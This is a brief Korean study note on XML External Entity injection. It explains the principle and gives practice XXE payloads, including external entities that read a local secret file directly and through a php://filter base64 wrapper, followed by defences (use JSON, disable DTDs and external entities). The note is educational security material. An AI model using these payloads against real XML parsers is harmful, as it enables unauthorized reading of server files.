---
CMDS: Security
관련 문서:
  - "[[109 Security]]"
tags:
  - "#XXE_Injection"
---
==X==ML E==x==ternal ==E==ntity Injection : XML을 이용하여 데이터를 주고 받을때 자원을 무단열람하는 행위

XML 파서 기능이 있는 어플리케이션을 공격

  

공격 원리 : XML에서 외부 개체를 참조하도록 DTD를 사용

  

실습

1. 내부 개체 참조
    
    ```XML
    <!DOCTYPE a[
    <!ENTITY str "cre">
    ]>
    <print>&str;</print>
    ```
    
2. 외부 개체 참조
    
    ```XML
    <!DOCTYPE a[
    <!ENTITY str SYSTEM "file:///information/secret_info.txt">
    ]>
    <print>&str;</print>
    ```
    
    ```XML
    <!DOCTYPE a[
    <!ENTITY str SYSTEM "php://filter/read=convert.base64-encode/resource=
    file:///information/secret_info.txt">
    ]>
    <print>&str;</print>
    ```
    

  

대응방안

1. JSON 데이터 형식으로 기능 구현
2. DTD 및 외부 엔티티 비활성화